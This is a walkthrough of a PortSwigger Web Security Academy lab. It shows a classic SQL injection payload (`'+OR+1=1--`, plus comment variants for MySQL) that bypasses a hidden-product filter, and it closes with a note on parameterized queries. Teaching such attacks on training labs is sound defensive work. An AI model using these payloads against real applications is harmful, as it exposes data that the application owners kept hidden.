# Lab 01 — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

> **Apprentice** · [Official lab](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

**Entry point:** `GET /filter?category=` (product category filter)

## Goal

Make the application display all products, including released and unreleased
items that are normally hidden by the `released = 1` condition.

## Background

The category parameter is interpolated directly into the query:

```sql
SELECT * FROM products WHERE category = '<INPUT>' AND released = 1
```

## Solution

1. Open any category, e.g. `Gifts`, and note the URL:
   `/filter?category=Gifts`
2. Inject a tautology plus comment to break out of the `released` condition:

```
/filter?category='+OR+1=1--
```

Resulting SQL:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

`--` comments out the rest of the query, so every row is returned.

3. The page now lists **all products**, including the hidden ones — lab solved.

> In the URL, spaces can be written as `+` or `%20`. If `--` alone fails
> (MySQL), use `-- -` or `#`.

## Mitigation

Use parameterized (prepared) statements — never concatenate user input into SQL.
